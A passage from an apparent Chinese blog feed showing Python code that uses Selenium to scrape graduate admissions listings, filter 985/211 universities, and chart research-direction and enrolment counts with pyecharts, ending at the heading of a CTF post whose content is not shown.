class="string">'北京理工大学'</span>, <span class="string">'北京航空航天大学'</span>, <span class="string">'北京化工大学'</span>,</span><br><span class="line">                    <span class="string">'北京邮电大学'</span>, <span class="string">'对外经济贸易大学'</span>, <span class="string">'中国传媒大学'</span>, <span class="string">'中央民族大学'</span>, <span class="string">'中国矿业大学'</span>, <span class="string">'中央财经大学'</span>,</span><br><span class="line">                    <span class="string">'中国政法大学'</span>, <span class="string">'中央音乐学院'</span>, <span class="string">'北京体育大学'</span>, <span class="string">'北京外国语大学'</span>, <span class="string">'北京交通大学'</span>, <span class="string">'北京科技大学'</span>,</span><br><span class="line">                    <span class="string">'北京林业大学'</span>, <span class="string">'中国农业大学'</span>, <span class="string">'北京中医药大学'</span>, <span class="string">'华北电力大学'</span>, <span class="string">'北京师范大学'</span>, <span class="string">'中国地质大学'</span>,</span><br><span class="line">                    <span class="string">'复旦大学'</span>, <span class="string">'华东师范大学'</span>, <span class="string">'上海外国语大学'</span>, <span class="string">'上海大学'</span>, <span class="string">'同济大学'</span>, <span class="string">'华东理工大学'</span>, <span class="string">'东华大学'</span>,</span><br><span class="line">                    <span class="string">'上海财经大学'</span>, <span class="string">'上海交通大学'</span>, <span class="string">'南开大学'</span>, <span class="string">'天津大学'</span>, <span class="string">'天津医科大学'</span>, <span class="string">'河北工业大学'</span>, <span class="string">'重庆大学'</span>,</span><br><span class="line">                    <span class="string">'西南大学'</span>, <span class="string">'太原理工大学'</span>, <span class="string">'内蒙古大学'</span>, <span class="string">'大连理工大学'</span>, <span class="string">'东北大学'</span>, <span class="string">'辽宁大学'</span>, <span class="string">'大连海事大学'</span>,</span><br><span class="line">                    <span class="string">'吉林大学'</span>, <span class="string">'东北师范大学'</span>, <span class="string">'延边大学'</span>, <span class="string">'东北农业大学'</span>, <span class="string">'东北林业大学'</span>, <span class="string">'哈尔滨工业大学'</span>, <span class="string">'哈尔滨工程大学'</span>,</span><br><span class="line">                    <span class="string">'南京大学'</span>, <span class="string">'东南大学'</span>, <span class="string">'苏州大学'</span>, <span class="string">'河海大学'</span>, <span class="string">'中国药科大学'</span>, <span class="string">'南京师范大学'</span>, <span class="string">'南京理工大学'</span>,</span><br><span class="line">                    <span class="string">'南京航空航天大学'</span>, <span class="string">'江南大学'</span>, <span class="string">'南京农业大学'</span>, <span class="string">'浙江大学'</span>, <span class="string">'安徽大学'</span>, <span class="string">'合肥工业大学'</span>, <span class="string">'中国科学技术大学'</span>,</span><br><span class="line">                    <span class="string">'厦门大学'</span>, <span class="string">'福州大学'</span>, <span class="string">'南昌大学'</span>, <span class="string">'山东大学'</span>, <span class="string">'中国海洋大学'</span>, <span class="string">'中国石油大学'</span>, <span class="string">'郑州大学'</span>, <span class="string">'武汉大学'</span>,</span><br><span class="line">                    <span class="string">'华中科技大学'</span>, <span class="string">'华中师范大学'</span>, <span class="string">'华中农业大学'</span>, <span class="string">'中南财经政法大学'</span>, <span class="string">'武汉理工大学'</span>, <span class="string">'湖南大学'</span>, <span class="string">'中南大学'</span>,</span><br><span class="line">                    <span class="string">'湖南师范大学'</span>, <span class="string">'中山大学'</span>, <span class="string">'暨南大学'</span>, <span class="string">'华南理工大学'</span>, <span class="string">'华南师范大学'</span>, <span class="string">'广西大学'</span>, <span class="string">'四川大学'</span>, <span class="string">'西南交通大学'</span>,</span><br><span class="line">                    <span class="string">'电子科技大学'</span>, <span class="string">'西南财经大学'</span>, <span class="string">'四川农业大学'</span>, <span class="string">'云南大学'</span>, <span class="string">'贵州大学'</span>, <span class="string">'西北大学'</span>, <span class="string">'西安交通大学'</span>,</span><br><span class="line">                    <span class="string">'西北工业大学'</span>, <span class="string">'陕西师范大学'</span>, <span class="string">'西北农林科大'</span>, <span class="string">'西安电子科技大学'</span>, <span class="string">'长安大学'</span>, <span class="string">'兰州大学'</span>, <span class="string">'新疆大学'</span>,</span><br><span class="line">                    <span class="string">'石河子大学'</span>, <span class="string">'海南大学'</span>, <span class="string">'宁夏大学'</span>, <span class="string">'青海大学'</span>, <span class="string">'西藏大学'</span>, <span class="string">'第二军医大学'</span>, <span class="string">'第四军医大学'</span>, <span class="string">'国防科学技术大学'</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># https://selenium-python-zh.readthedocs.io/en/latest/api.html</span></span><br><span class="line">        <span class="comment"># 使用 Select 处理下拉框的选项</span></span><br><span class="line">        <span class="comment"># 先通过 Xpath 找到 select 标签，然后通过 value 找到对应值即可选择</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># print("当前正在选择的城市代码为： " + self.count)</span></span><br><span class="line">            Select(driver.find_element_by_xpath(<span class="string">"//select[@id='ssdm']"</span>)).select_by_value(self.count)</span><br><span class="line">            Select(driver.find_element_by_xpath(<span class="string">"//select[@id='mldm']"</span>)).select_by_value(self.mldm)</span><br><span class="line">            Select(driver.find_element_by_xpath(<span class="string">"//select[@id='yjxkdm']"</span>)).select_by_value(self.yjxkdm)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 找到查询按钮进行点击,进入高校列表界面</span></span><br><span class="line">            <span class="comment"># 点击完还是在一个 tab 里， handle 也一样</span></span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//input[@name='button']"</span>).click()</span><br><span class="line">            self.set_height_width(driver)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 得到高校列表</span></span><br><span class="line">            school_name_list, major_numbers_list, number_list, flag= self.get_school_name(driver)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> school <span class="keyword">in</span> school_name_list:</span><br><span class="line">                school = school[<span class="number">7</span>::]</span><br><span class="line">                school_list.append(school)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"选择条件出现错误，请检查门类代码与学科类别代码对应关系是否正确！程序即将退出..."</span>.rjust(<span class="number">50</span>, <span class="string">'*'</span>))</span><br><span class="line"></span><br><span class="line">        empty = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> school_list:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> list_211:</span><br><span class="line">                <span class="keyword">if</span> i == j:</span><br><span class="line"></span><br><span class="line">                    empty.append(i)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">"当前条件下，985&amp;211 院校有："</span>)</span><br><span class="line">        print(empty)</span><br><span class="line"></span><br><span class="line">        driver.close()</span><br><span class="line">        driver.quit()</span><br><span class="line">        <span class="comment"># print(school_list, major_numbers_list, number_list)</span></span><br><span class="line">        <span class="comment"># ['黑龙江大学', '哈尔滨工业大学', '哈尔滨理工大学', '哈尔滨工程大学', '黑龙江科技大学', '东北石油大学', '黑龙江八一农垦大学', '东北林业大学', '哈尔滨师范大学', '齐齐哈尔大学']</span></span><br><span class="line">        <span class="comment">#  [8, 21, 15, 59, 6, 10, 2, 3, 10, 6]</span></span><br><span class="line">        <span class="comment">#  [78, 1549, 123, 201, 153, 149, 331, 221, 115, 520]</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">"正在准备绘制图表..."</span>)</span><br><span class="line">        <span class="keyword">return</span> school_name_list, major_numbers_list, number_list, flag</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stacked_area_chart</span><span class="params">(self, x_data, y1_data, y2_data, flag)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(flag):</span><br><span class="line">            (</span><br><span class="line">                Line()</span><br><span class="line">                    .add_xaxis(xaxis_data=x_data)</span><br><span class="line">                    .add_yaxis(</span><br><span class="line">                    series_name=<span class="string">"研究方向数量"</span>,</span><br><span class="line">                    stack=<span class="string">"总量"</span>,</span><br><span class="line">                    y_axis=y1_data,</span><br><span class="line">                    areastyle_opts=opts.AreaStyleOpts(opacity=<span class="number">0.5</span>),</span><br><span class="line">                    label_opts=opts.LabelOpts(is_show=<span class="literal">False</span>),</span><br><span class="line">                )</span><br><span class="line">                    .add_yaxis(</span><br><span class="line">                    series_name=<span class="string">"拟招生人数"</span>,</span><br><span class="line">                    stack=<span class="string">"总量"</span>,</span><br><span class="line">                    y_axis=y2_data,</span><br><span class="line">                    areastyle_opts=opts.AreaStyleOpts(opacity=<span class="number">0.5</span>),</span><br><span class="line">                    label_opts=opts.LabelOpts(is_show=<span class="literal">False</span>),</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">                    .set_global_opts(</span><br><span class="line">                    title_opts=opts.TitleOpts(title=<span class="string">"高校研究方向折线图"</span>),</span><br><span class="line">                    tooltip_opts=opts.TooltipOpts(trigger=<span class="string">"axis"</span>, axis_pointer_type=<span class="string">"cross"</span>),</span><br><span class="line">                    yaxis_opts=opts.AxisOpts(</span><br><span class="line">                        type_=<span class="string">"value"</span>,</span><br><span class="line">                        axistick_opts=opts.AxisTickOpts(is_show=<span class="literal">True</span>),</span><br><span class="line">                        splitline_opts=opts.SplitLineOpts(is_show=<span class="literal">True</span>),</span><br><span class="line">                    ),</span><br><span class="line"></span><br><span class="line">                    xaxis_opts=opts.AxisOpts(type_=<span class="string">"category"</span>, boundary_gap=<span class="literal">False</span>, name_rotate=<span class="number">60</span>, name_gap=<span class="number">20</span>),</span><br><span class="line">                )</span><br><span class="line">                    .render(<span class="string">"ReserachDirections.html"</span>)</span><br><span class="line">            )</span><br><span class="line">            print(<span class="string">"绘制成功，请在同级目录下查看 ReserachDirections.html 文件！"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"出现错误，停止绘制图表！"</span>)</span><br></pre></td></tr></table></figure><p><strong>RDsBySchoolName.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@author: Brian</span></span><br><span class="line"><span class="string">@file: RDsBySchoolName.py</span></span><br><span class="line"><span class="string">@time: 2020/7/1 14:20</span></span><br><span class="line"><span class="string">@desc: 通过学校名字来获得相关信息</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> Select</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">from</span> pyecharts.charts <span class="keyword">import</span> Line</span><br><span class="line"><span class="keyword">from</span> pyecharts.charts <span class="keyword">import</span> Bar</span><br><span class="line"><span class="keyword">from</span> pyecharts <span class="keyword">import</span> options <span class="keyword">as</span> opts</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RDsBySchoolName</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url, schoolname, yjxkdm)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.schoolname = schoolname</span><br><span class="line">        self.yjxkdm = yjxkdm</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 配置 driver</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_driver</span><span class="params">(self)</span>:</span></span><br><span class="line">        chrome_options = Options()</span><br><span class="line">        chrome_options.add_argument(<span class="string">"--headless"</span>)</span><br><span class="line">        chrome_options.add_argument(<span class="string">"--disable-gpu"</span>)</span><br><span class="line">        driver = webdriver.Chrome(executable_path=<span class="string">"E:/Program Files/chromedriver_win32/chromedriver.exe"</span>,</span><br><span class="line">                                  chrome_options=chrome_options)</span><br><span class="line">        driver.get(self.url)</span><br><span class="line">        driver = self.set_height_width(driver)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> driver</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将设置屏幕大小独立出来，方便每次跳转完使用</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_height_width</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        width = driver.execute_script(<span class="string">"return document.documentElement.scrollWidth"</span>)</span><br><span class="line">        height = driver.execute_script(<span class="string">"return document.documentElement.scrollHeight"</span>)</span><br><span class="line">        driver.set_window_size(width, height)</span><br><span class="line">        <span class="keyword">return</span> driver</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果需要翻页就翻页</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">paging</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        ul = driver.find_element_by_xpath(<span class="string">"//ul[@class='ch-page']"</span>)</span><br><span class="line">        li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">        <span class="comment"># print("当前页面翻页元素长度：" + str(len(li)))</span></span><br><span class="line">        <span class="comment"># 第一页右下角的标签数量最大为10，小于10时没有 Go 输入跳转框</span></span><br><span class="line">        <span class="keyword">if</span>(len(li) &lt; <span class="number">10</span>):</span><br><span class="line">            pagenumber = int(li[<span class="number">-2</span>].text)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pagenumber = int(li[<span class="number">-3</span>].text)</span><br><span class="line">        <span class="comment"># print("当前页面页数：" + str(pagenumber))</span></span><br><span class="line">        <span class="keyword">return</span> pagenumber</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通过学校名与专业选择学校</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">select_school</span><span class="params">(self, driver,)</span>:</span></span><br><span class="line">        <span class="comment"># 专业列表,研究方向数量列表，拟招生人数列表</span></span><br><span class="line">        label_list = []</span><br><span class="line">        major_number_list = []</span><br><span class="line">        admission_list = []</span><br><span class="line">        original_window = driver.current_window_handle</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//input[@id='dwmc']"</span>).send_keys(self.schoolname)</span><br><span class="line">            Select(driver.find_element_by_xpath(<span class="string">"//select[@id='yjxkdm']"</span>)).select_by_value(self.yjxkdm)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 找到查询按钮进行点击,进入高校列表界面</span></span><br><span class="line">            <span class="comment"># 点击完还是在一个 tab 里， handle 也一样</span></span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//input[@name='button']"</span>).click()</span><br><span class="line"></span><br><span class="line">            school_name = driver.find_element_by_xpath(<span class="string">"//tr[1]//td[1]//form[1]//a[1]"</span>).get_attribute(</span><br><span class="line">                <span class="string">"textContent"</span>)</span><br><span class="line">            print(school_name)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 跳转到每个学校对应的研究方向信息页面</span></span><br><span class="line">            driver.find_element_by_link_text(school_name).click()</span><br><span class="line">            <span class="keyword">for</span> window_handle <span class="keyword">in</span> driver.window_handles:</span><br><span class="line">                <span class="keyword">if</span> window_handle != original_window:</span><br><span class="line">                    driver.switch_to.window(window_handle)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            driver = self.set_height_width(driver)</span><br><span class="line"></span><br><span class="line">            label_list, major_number_list, admission_list = self.get_major_list(driver)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            print(<span class="string">"选择条件出现错误，请检查学校名称与学科类别代码是否正确，或是该院校未开设该专业！程序即将退出..."</span>)</span><br><span class="line"></span><br><span class="line">        driver.close()</span><br><span class="line">        driver.quit()</span><br><span class="line">        <span class="keyword">return</span> label_list, major_number_list, admission_list, flag</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_major_list</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        major_number_list = []</span><br><span class="line">        admission_list = []</span><br><span class="line">        label_list = []</span><br><span class="line">        value_list = []</span><br><span class="line"></span><br><span class="line">        ul = driver.find_element_by_xpath(<span class="string">"//ul[@class='zsml-zy-filter']"</span>)</span><br><span class="line">        li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">        print(<span class="string">"当前院校专业数量："</span> + str(len(li)))</span><br><span class="line"></span><br><span class="line">        input_selector = <span class="string">"/html[1]/body[1]/div[2]/div[3]/div[1]/div[2]/div[2]/form[1]/ul[1]/li[&#123;&#125;]/input[1]"</span></span><br><span class="line">        label_selector = <span class="string">"/html[1]/body[1]/div[2]/div[3]/div[1]/div[2]/div[2]/form[1]/ul[1]/li[&#123;&#125;]/label[1]"</span></span><br><span class="line">        <span class="keyword">for</span> check_box <span class="keyword">in</span> range(<span class="number">1</span>, len(li)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                value = driver.find_element_by_xpath(input_selector.format(check_box)).get_attribute(<span class="string">"value"</span>)</span><br><span class="line">                label = driver.find_element_by_xpath(label_selector.format(check_box)).get_attribute(<span class="string">"textContent"</span>)</span><br><span class="line">                driver.find_element_by_xpath(input_selector.format(check_box)).click()</span><br><span class="line">                driver.find_element_by_xpath(<span class="string">"//input[@class='blue-btn-s']"</span>).click()</span><br><span class="line">                label_list.append(label)</span><br><span class="line">                value_list.append(value)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 得到每个专业下的研究方向数量与拟招生人数</span></span><br><span class="line">                majors, all_number = self.get_major_info(driver)</span><br><span class="line">                major_number_list.append(majors)</span><br><span class="line">                admission_list.append(all_number)</span><br><span class="line"></span><br><span class="line">                print(<span class="string">" 当前专业："</span> + label)</span><br><span class="line">                print(<span class="string">" 研究方向数量： "</span> + str(majors), <span class="string">"拟招生人数： "</span> + str(all_number))</span><br><span class="line">                <span class="comment"># 两次点击取消选择</span></span><br><span class="line">                driver.find_element_by_xpath(input_selector.format(check_box)).click()</span><br><span class="line">                driver.find_element_by_xpath(<span class="string">"//input[@class='blue-btn-s']"</span>).click()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line">        print(value_list, label_list)</span><br><span class="line">        print(major_number_list, admission_list)</span><br><span class="line">        <span class="keyword">return</span> label_list, major_number_list, admission_list</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 得到研究方向数量与拟招生人数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_major_info</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        <span class="comment"># 当前 Tab 里有多少个页面</span></span><br><span class="line">        pagenumber = self.paging(driver)</span><br><span class="line">        majors = <span class="number">0</span></span><br><span class="line">        all_number = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 定位跳转</span></span><br><span class="line">        css_selector_jumpto = <span class="string">"body.ch-sticky:nth-child(2) "</span> \</span><br><span class="line">                              <span class="string">"div.main-wrapper:nth-child(2) "</span> \</span><br><span class="line">                              <span class="string">"div.container.clearfix:nth-child(5) "</span> \</span><br><span class="line">                              <span class="string">"div.zsml-row.clearfix "</span> \</span><br><span class="line">                              <span class="string">"div.zsml-page-box ul.ch-page "</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pagenumber == <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 不用下一页操作</span></span><br><span class="line">            major = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">            majors += len(major)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(major) + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    number = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[7]//a[1]"</span>.format(i)).get_attribute(<span class="string">"data-title"</span>)</span><br><span class="line">                    numbers = re.sub(<span class="string">r"[^0-9]"</span>, <span class="string">""</span>, number)</span><br><span class="line">                    all_number += int(numbers)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    print(e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 找到下一页按钮</span></span><br><span class="line">            <span class="keyword">while</span> (pagenumber):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    major = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                    <span class="comment"># print("这一页的研究方向数量" + str(len(major)))</span></span><br><span class="line">                    majors += len(major)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(major) + <span class="number">1</span>):</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            number = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[7]//a[1]"</span>.format(i)).get_attribute(</span><br><span class="line">                                <span class="string">"data-title"</span>)</span><br><span class="line">                            numbers = re.sub(<span class="string">r"[^0-9]"</span>, <span class="string">""</span>, number)</span><br><span class="line">                            <span class="comment"># print("  拟招生：" + numbers)</span></span><br><span class="line">                            all_number += int(numbers)</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                            print(e)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    print(e)</span><br><span class="line">                ul = driver.find_element_by_css_selector(css_selector_jumpto)</span><br><span class="line">                li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">                li[<span class="number">-1</span>].click()</span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> majors, all_number</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数据可视化</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stacked_area_chart</span><span class="params">(self, x_data, y1_data, y2_data, flag)</span>:</span></span><br><span class="line">        schoolname = self.schoolname</span><br><span class="line">        <span class="keyword">if</span>(flag):</span><br><span class="line">            (</span><br><span class="line">                Bar()</span><br><span class="line">                    .add_xaxis(xaxis_data=x_data)</span><br><span class="line">                    .add_yaxis(<span class="string">"专业下研究方向数量"</span>, y1_data)</span><br><span class="line">                    .add_yaxis(<span class="string">"各专业拟招生人数"</span>, y2_data)</span><br><span class="line">                    .set_global_opts(</span><br><span class="line">                    xaxis_opts=opts.AxisOpts(axislabel_opts=opts.LabelOpts(rotate=<span class="number">-15</span>)),</span><br><span class="line">                    title_opts=opts.TitleOpts(title=schoolname + <span class="string">"专业信息折线图"</span>, subtitle=<span class="string">"下属研究方向与拟招生人数"</span>),</span><br><span class="line">                )</span><br><span class="line">                    .render(<span class="string">"ReserachDirections.html"</span>)</span><br><span class="line">            )</span><br><span class="line">            print(<span class="string">"绘制成功，请在同级目录下查看 ReserachDirections.html 文件！"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"出现错误，停止绘制图表！"</span>)</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/J080624/article/details/84171917" target="_blank" rel="noopener">AJAX-XMLHtppRequest 的前世今生</a></p><p><a href="https://blog.csdn.net/qq_33689414/article/details/78631009" target="_blank" rel="noopener">Selenium和PhantomJS介绍</a></p><p><a href="https://programmer.group/python-crawler-8-selenium-and-phantomjs-for-dynamic-html-processing.html" target="_blank" rel="noopener">Pyhon爬虫教程</a></p><p><a href="http://pyecharts.org/#/zh-cn/intro" target="_blank" rel="noopener">pyecharts官网</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF</title>
      <link href="/2019/11/26/NCTF/"/>
      <url>/2019/11/26/NCTF/</url>
      
